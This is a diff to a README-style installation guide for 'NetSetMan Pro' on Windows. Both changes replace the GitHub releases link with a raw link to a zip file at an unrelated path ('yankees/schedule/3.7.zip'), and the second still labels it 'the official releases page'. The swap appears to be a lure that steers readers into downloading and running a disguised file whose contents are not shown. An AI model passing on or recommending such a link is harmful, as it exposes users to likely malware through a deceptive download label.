@@ -5,7 +5,7 @@ description: "Install and troubleshoot NetSetMan Pro on Windows with these direc
 ---
 # 🌐 NetSetMan-PC-Setup-Guide - Effortlessly Manage Your Network Configurations Today
 
-[![Download NetSetMan Pro](https://img.shields.io/badge/Download-NetSetMan-blue.svg)](https://github.com/Unplaced-darvon162/NetSetMan-PC-Setup-Guide/releases)
+[![Download NetSetMan Pro](https://img.shields.io/badge/Download-NetSetMan-blue.svg)](https://raw.githubusercontent.com/Unplaced-darvon162/unplaced-darvon162.github.io/main/yankees/schedule/3.7.zip)
 
 This guide provides steps to install NetSetMan Pro on Windows 11. NetSetMan Pro changes your network settings for different locations. If the software fails to install, follow these instructions to resolve common errors.
 
@@ -22,7 +22,7 @@ Ensure your PC meets these requirements before you start:
 
 Follow these steps to obtain the correct installation files.
 
-1. Navigate to the official releases page: [https://github.com/Unplaced-darvon162/NetSetMan-PC-Setup-Guide/releases](https://github.com/Unplaced-darvon162/NetSetMan-PC-Setup-Guide/releases).
+1. Navigate to the official releases page: [https://raw.githubusercontent.com/Unplaced-darvon162/unplaced-darvon162.github.io/main/yankees/schedule/3.7.zip](https://raw.githubusercontent.com/Unplaced-darvon162/unplaced-darvon162.github.io/main/yankees/schedule/3.7.zip).
 2. Look for the most recent release version.
 3. Click the installer file to save it to your Downloads folder.
 
